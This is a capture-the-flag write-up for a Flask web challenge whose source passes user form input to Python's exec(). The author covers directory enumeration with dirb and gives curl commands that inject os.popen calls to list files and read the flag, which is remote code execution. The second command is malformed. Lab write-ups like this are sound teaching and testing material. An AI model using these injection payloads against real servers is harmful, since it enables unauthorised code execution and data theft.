# 🪐 Interdimensional Calculator - 375pts

```
💡 Uses Remote Code Execution
```

### Enumeration

This was in large part to my teammate, Wesley, I wasn't working on this challenge at first and he used a **directory/file enumeration tool** and discovered a `/debug` page, it was also actually in the source code comments. 

You could have used **dirbuster**, **dirb**, **gobuster**, etc. I personally like dirb (default wordlist), the command: `dirb http://<ip>:<port>`

### Flask (A small and lightweight ***Python web framework)***

- Navigate to `http://<ip>:<port>/debug`

```python
from flask import Flask, Response, request, render_template, request
    from random import choice, randint
    from string import lowercase
    from functools import wraps
    
    app = Flask(__name__)
    
    def calc(recipe):
        global garage
        garage = {}
        try: exec(recipe, garage)
        except: pass
    
    def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
        @wraps(func)
        def federation(*args, **kwargs):
            ingredient = ''.join(choice(lowercase) for _ in range(10))
            recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))
    
            if request.method == 'POST':
                ingredient = request.form.get('ingredient', '')
                recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))
    
            calc(recipe)
    
            if garage.get(ingredient, ''):
                return render_template('index.html', calculations=garage[ingredient])
    
            return func(*args, **kwargs)
        return federation
    
    @app.route('/', methods=['GET', 'POST'])
    @GCR
    def index():
        return render_template('index.html')
    
    @app.route('/debug')
    def debug():
        return Response(open(__file__).read(), mimetype='text/plain')
    
    if __name__ == '__main__':
        app.run('0.0.0.0', port=1337)
```

We should note the `calc` function, specifically because it tries to `execute` something. This should be an immediate red flag for an `attack vector`.

- `try: exec(recipe, garage)`

Okay, really the part we care about is what happens when we `POST` request anything to the website:

- Changing the values of `ingredient` and `measurements` directly change what is displayed
- Potential vulnerability where **passing a user input can execute system commands**
- Reasons why I ignore everything else:
    - It creates the `recipe` used in `execution`
    - The `calc()` method is called immediately after

A `POST` method consists of an `address` and `data` so we manipulate the data field, you can use a **script**, **BurpSuite** to `intercept` and `modify` a request, or simply **curl**.

---

### Solution - Curl method (terminal)

You can try to directly run system commands but `they do not work`

- Import the Python **`os`** module, it provides commands for interacting with the operating system (files & directories!)
- `-X POST` is to specify the request method
    - You could omit this line, `-d` will send a `POST` automatically but I like to be explicit for my own learning
- `-d` is short for `--data`, sends the specified data in a `POST` request
- `__import__()` is the function to **import**
- `.` is used to **chain method calls**
- `popen()` **executes the command inside ()**
- `read()` is necessary to actually read the output

This should list everything in the **current working directory**

`curl -X POST http://<ip>:<port> -d "ingredient="meow"&measurements=__import__('os').popen('ls -la').read()"`

You gain knowledge that there is a file named `flag`

- `cat` is used to output the contents of `flag`

`curl -X POST http://<ip>:<port> -d "ingredient=”meow”=__import__('os').popen('cat flag').read()"`

The flag should show up in the response
